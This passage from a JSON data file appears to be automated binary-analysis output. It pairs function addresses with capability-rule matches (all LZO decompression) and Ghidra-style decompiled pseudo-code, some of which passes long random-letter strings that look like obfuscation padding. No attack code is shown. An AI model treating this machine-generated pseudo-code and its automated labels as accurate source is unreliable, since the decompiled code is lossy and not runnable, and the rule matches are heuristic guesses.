        "decompiled_code": "\ncode ** __cdecl fcn.00402afe(uint arg_8h, uint arg_ch)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404f61(arg_ch);\n    *in_ECX = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n    fcn.00402397(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 106
    },
    "00402b44": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __cdecl fcn.00402b44(code *arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t aiStack92 [8];\n    uint *puStack60;\n    int32_t *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    code **var_28h;\n    uint var_24h;\n    uint var_ch;\n    code *var_8h;\n    code *var_4h;\n    \n    var_2ch = &fcn.00402b44::var_34h;\n    puStack60 = &fcn.00402b44::var_34h;\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    var_34h = &stack0xffffffa4;\n    fcn.00403f7b(arg_10h);\n    piVar1 = var_34h;\n    var_34h[1] = var_8h;\n    piVar1[2] = var_4h;\n    *piVar1 = &fcn.00402b44::var_24h;\n    fcn.00406415(arg_10h);\n    puVar2 = var_2ch;\n    puVar3 = var_2ch + -4;\n    *(var_2ch + -4) = &fcn.00402b44::var_24h;\n    *(puVar2 + -8) = 0x41eb72;\n    fcn.00402de2(*puVar3);\n    *(puVar2 + -8) = 0x41eb7a;\n    fcn.00403b02();\n    *var_28h = vtable.std::_System_error.0;\n    var_28h[3] = var_8h;\n    var_28h[4] = var_4h;\n    return;\n}\n",
        "token_count": 448
    },
    "00402ce3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402ce3(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a6610:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a6610;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 431
    },
    "00402d3d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402d3d(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x44fe20;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 183
    },
    "00402db5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00402db5(void)\n\n{\n    fcn.00401e79(\"fovlmfgudyyihsblsruglermeintoxfxxyinckunav\");\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 56
    },
    "00402de2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402de2(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004052c7();\n    fcn.004030f3(arg_8h_00);\n    *in_ECX = vtable.std::runtime_error.0;\n    return;\n}\n",
        "token_count": 104
    },
    "00402e2d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402e2d(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4515c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 2;\n    fcn.00401e79(\"dreatuifezmoi\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x136b5;\n}\n",
        "token_count": 221
    },
    "00402f31": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402f31(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451880;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"jknra\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xace5;\n}\n",
        "token_count": 167
    },
    "00402f81": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f81(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004032d3(*(in_ECX + 0x30));\n    return arg_8h;\n}\n",
        "token_count": 67
    },
    "00402fa4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00402fa4(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    uVar1 = fcn.0040257c();\n    if (uVar1 < arg_8h) {\n        fcn.0040393b();\n    }\n    var_ch = in_ECX[5];\n    var_10h = fcn.00403d23(arg_8h);\n    var_14h = fcn.0040407a();\n    var_18h = fcn.004015aa(var_10h + 1);\n    fcn.00401b09();\n    in_ECX[4] = arg_8h;\n    in_ECX[5] = var_10h;\n    arg_8h_00 = fcn.00405290(var_18h);\n    fcn.004047b4(arg_8h_00, arg_8h, arg_10h);\n    if (var_ch < 0x10) {\n        fcn.004025b8(in_ECX, &var_18h);\n    }\n    else {\n        fcn.0040123a(*in_ECX, var_ch + 1);\n        *in_ECX = var_18h;\n    }\n    return in_ECX;\n}\n",
        "token_count": 380
    },
    "00402fbd": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fbd(uint arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    (**(*in_ECX + 0x18))(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 67
    },
    "00403189": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * fcn.00403189(int32_t *param_1, uint8_t param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (param_3 == NULL) {\n        return param_1;\n    }\n    iVar1 = param_2 * 0x1010101;\n    piVar2 = param_1;\n    if (0x20 < param_3) {\n        if (0x7f < param_3) {\n            if ((*0x573c50 >> 1 & 1) != 0) {\n                for (; param_3 != NULL; param_3 = param_3 + -1) {\n                    *piVar2 = iVar1;\n                    piVar2 = piVar2 + 1;\n                }\n                return param_1;\n            }\n            if ((*0x571c9c >> 1 & 1) == 0) goto joined_r0x004866fb;\n            *param_1 = iVar1;\n            param_1[1] = iVar1;\n            param_1[2] = iVar1;\n            param_1[3] = iVar1;\n            piVar2 = param_1 + 4 & 0xfffffff0;\n            param_3 = param_1 + (param_3 - piVar2);\n            if (0x80 < param_3) {\n                do {\n                    *piVar2 = iVar1;\n                    piVar2[1] = iVar1;\n                    piVar2[2] = iVar1;\n                    piVar2[3] = iVar1;\n                    piVar2[4] = iVar1;\n                    piVar2[5] = iVar1;\n                    piVar2[6] = iVar1;\n                    piVar2[7] = iVar1;\n                    piVar2[8] = iVar1;\n                    piVar2[9] = iVar1;\n                    piVar2[10] = iVar1;\n                    piVar2[0xb] = iVar1;\n                    piVar2[0xc] = iVar1;\n                    piVar2[0xd] = iVar1;\n                    piVar2[0xe] = iVar1;\n                    piVar2[0xf] = iVar1;\n                    piVar2[0x10] = iVar1;\n                    piVar2[0x11] = iVar1;\n                    piVar2[0x12] = iVar1;\n                    piVar2[0x13] = iVar1;\n                    piVar2[0x14] = iVar1;\n                    piVar2[0x15] = iVar1;\n                    piVar2[0x16] = iVar1;\n                    piVar2[0x17] = iVar1;\n                    piVar2[0x18] = iVar1;\n                    piVar2[0x19] = iVar1;\n                    piVar2[0x1a] = iVar1;\n                    piVar2[0x1b] = iVar1;\n                    piVar2[0x1c] = iVar1;\n                    piVar2[0x1d] = iVar1;\n                    piVar2[0x1e] = iVar1;\n                    piVar2[0x1f] = iVar1;\n                    piVar2 = piVar2 + 0x20;\n                    param_3 = param_3 + -0x80;\n                } while ((param_3 & 0xffffff00) != 0);\n                goto code_r0x004866c0;\n            }\n        }\n        if ((*0x571c9c >> 1 & 1) != 0) {\ncode_r0x004866c0:\n            if (0x1f < param_3) {\n                do {\n                    *piVar2 = iVar1;\n                    piVar2[1] = iVar1;\n                    piVar2[2] = iVar1;\n                    piVar2[3] = iVar1;\n                    piVar2[4] = iVar1;\n                    piVar2[5] = iVar1;\n                    piVar2[6] = iVar1;\n                    piVar2[7] = iVar1;\n                    piVar2 = piVar2 + 8;\n                    param_3 = param_3 + -0x20;\n                } while (0x1f < param_3);\n                if ((param_3 & 0x1f) == 0) {\n                    return param_1;\n                }\n            }\n            piVar2 = piVar2 + param_3 + -0x20;\n            *piVar2 = iVar1;\n            piVar2[1] = iVar1;\n            piVar2[2] = iVar1;\n            piVar2[3] = iVar1;\n            piVar2[4] = iVar1;\n            piVar2[5] = iVar1;\n            piVar2[6] = iVar1;\n            piVar2[7] = iVar1;\n            return param_1;\n        }\n    }\njoined_r0x004866fb:\n    for (; (param_3 & 3) != 0; param_3 = param_3 + -1) {\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n    }\n    if ((param_3 & 4) != 0) {\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_3 = param_3 + -4;\n    }\n    for (; (param_3 & 0xfffffff8) != 0; param_3 = param_3 + -8) {\n        *piVar2 = iVar1;\n        piVar2[1] = iVar1;\n        piVar2 = piVar2 + 2;\n    }\n    return param_1;\n}\n",
        "token_count": 1256
    },
    "0040344a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040344a(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450240;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"kqezqbi\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x5dd4;\n}\n",
        "token_count": 193
    },
    "0040349f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0040349f(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x451440;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"nuwmwlekiazcpalnnknadjukicmyxeuoyiidiaqdfyrvotgjyi\");\n    uStack24 = 0;\n    fcn.00401e79(\"wxhhdpizoimgdbdjbaquobajpciqwxwxfnxfgothaxpqiosiwynmwyoxosywqeipfdhqva\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x3d5b;\n}\n",
        "token_count": 231
    },
    "00403558": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403558(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a675d:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a675d;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "004035c1": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004035c1(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4504e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"rmkubbviavropcggyswilbwfdunxqcfienyxthozcivvkvromruxpbcpuzz\");\n    uStack24 = 4;\n    fcn.00401e79(\"brcgonriidrjfetrjjfkrgsdqdyiovqqkgyupqdjfv\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x10ba3;\n}\n",
        "token_count": 264
    },
    "00403607": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403607(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    uVar1 = fcn.0040257c();\n    if (uVar1 < arg_8h) {\n        fcn.0040393b();\n    }\n    var_ch = in_ECX[5];\n    var_10h = fcn.00403d23(arg_8h);\n    var_14h = fcn.0040407a();\n    var_18h = fcn.004015aa(var_10h + 1);\n    fcn.00401b09();\n    in_ECX[4] = arg_8h;\n    in_ECX[5] = var_10h;\n    arg_8h_00 = fcn.00405290(var_18h);\n    fcn.00406910(arg_8h_00, arg_8h, arg_10h);\n    if (var_ch < 0x10) {\n        fcn.004025b8(in_ECX, &var_18h);\n    }\n    else {\n        fcn.0040123a(*in_ECX, var_ch + 1);\n        *in_ECX = var_18h;\n    }\n    return in_ECX;\n}\n",
        "token_count": 371
    },
    "00403710": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00403710(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450f40;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"rxhxzrbittkwfuutmwunvjttqw\");\n    uStack24 = 2;\n    fcn.00401e79(\"wfcuawqnhcspnwcnerdrxzsnwbjhlthifcnhhokysnntmnpdbdpqvwqtk\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x5470d4;\n}\n",
        "token_count": 240
    },
    "0040374c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040374c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x451540;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"npmyhzgmghaowji\");\n    var_10h = 0;\n    fcn.00401e79(\"mtexnakybrriwigyxqclvhpqhlyyghdchgjh\");\n    var_10h = 1;\n    fcn.00401e79(\"eaxzgqaykdyhywdpvsvyylmxfdnekzgapsznwnujuuoxalbjnvclgtzzccbqdjzpyeqpkohehacpynrza\");\n    var_10h = 2;\n    fcn.00401e79(\"afhpwxgqihmxszkzrqcaejjqnneprkqobrhesujayykjexdnllxgeacgiznnzifkckxqldjgqbw\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 381
    },
    "0040375b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040375b(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x4271c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.004010b9();\n    fcn.00402ab8(0x533627, in_ECX);\n    fcn.00401f3c();\n    var_10h = 0;\n    fcn.0040664a(arg_8h, arg_ch);\n    fcn.0040694c();\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 246
    },
    "00403882": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00403882(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4516c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"ezyxysjwpbccqizigealmtmfsurirhwpngymdsawemhjiaserdkrpbbueahjtkrrjwvgobvywhrpftnlvjpyompgrfqluhzyerz\");\n    uStack24 = 1;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 237
    },
    "004038eb": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038eb(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    fcn.00401e79(\"yoalwkcrwptezgwgdwcagfveutbglaoebvjpqclngkdumlptoqtpjsileovisqyvgk\");\n    fcn.00403b02();\n    return 0x139f5;\n}\n",
        "token_count": 110
    },
    "004039a9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004039a9(uint param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403922();\n    fcn.00404ea3(0x533627);\n    fcn.00403035();\n    return param_1;\n}\n",
        "token_count": 74
    },
    "00403a53": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403a53(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451040;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"sodlsovhitkpiftitoqcvrsblnubofwwnxfkoxqy\");\n    uStack24 = 1;\n    fcn.00401e79(\"crhm\");\n    uStack24 = 2;\n    fcn.00401e79(\"bikatfzfaomh\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 246
    },
    "00403b66": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403b66(uint param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = fcn.00405240(param_4, &stack0xfffffffc, param_1);\n    (*pcVar1)();\n    iVar2 = *(param_4 + 0x10);\n    if (iVar2 == 0x100) {\n        iVar2 = 2;\n    }\n    fcn.00405240(iVar2, param_4);\n    return;\n}\n",
        "token_count": 135
    },
    "00403bbb": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403bbb(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4503c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"jacnvkglzofxpnyqmaocioey\");\n    uStack24 = 0;\n    fcn.00401e79(\"wiznbamomjqxemglswpoygvnvjnxwjkszlastyouisyjyg\");\n    uStack24 = 1;\n    fcn.00401e79(\"ygzowggsqgpndjc\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 237
    },
    "00403d19": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403d19(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.00402464(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a66a2:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.004051cd();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404309();\n            if (iVar3 == 0) {\ncode_r0x004a66ba:\n                puVar4 = fcn.00403a35();\n                *puVar4 = 0x16;\n                fcn.004037ce();\n                goto code_r0x004a66a2;\n            }\n            iVar3 = fcn.00402798(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a66ba;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 424
    },
    "00403efe": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403efe(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    \n    var_18h = in_ECX[4];\n    var_14h = in_ECX;\n    iVar1 = fcn.00404d81();\n    if (iVar1 - var_18h < arg_8h) {\n        fcn.0040393b();\n    }\n    var_1ch = var_18h + arg_8h;\n    var_20h = var_14h[5];\n    var_24h = fcn.004027b1(var_1ch);\n    var_28h = fcn.004021e9();\n    var_2ch = fcn.00404480(var_24h + 1);\n    fcn.00401b09();\n    var_14h[4] = var_1ch;\n    var_14h[5] = var_24h;\n    arg_8h_01 = fcn.00402216(var_2ch);\n    iVar1 = var_18h;\n    if (var_20h < 8) {\n        fcn.004033f5(arg_8h_01, var_14h, var_18h, arg_10h, arg_14h & 0xffff);\n        fcn.00401bc7(var_14h, &var_2ch);\n    }\n    else {\n        arg_8h_00 = *var_14h;\n        arg_ch_00 = fcn.00402216(arg_8h_00);\n        fcn.004033f5(arg_8h_01, arg_ch_00, iVar1, arg_10h, arg_14h & 0xffff);\n        fcn.00406082(arg_8h_00, var_20h + 1);\n        *var_14h = var_2ch;\n    }\n    return in_ECX;\n}\n",
        "token_count": 574
    },
    "00403f7b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403f7b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *puVar1;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffb8;\n    var_10h = 0xffffffff;\n    var_14h = 0x427000;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    arg_ch = fcn.0040641a();\n    puVar1 = &var_24h;\n    fcn.00402a8b(&var_24h, arg_ch);\n    fcn.004018ed(puVar1 & 0xffffff00 | var_28h, &var_24h);\n    fcn.00402ab8(0x533627, in_ECX);\n    var_10h = 0;\n    fcn.00402b35(arg_8h);\n    fcn.0040694c();\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 338
    },
    "00404025": {
        "rules": [
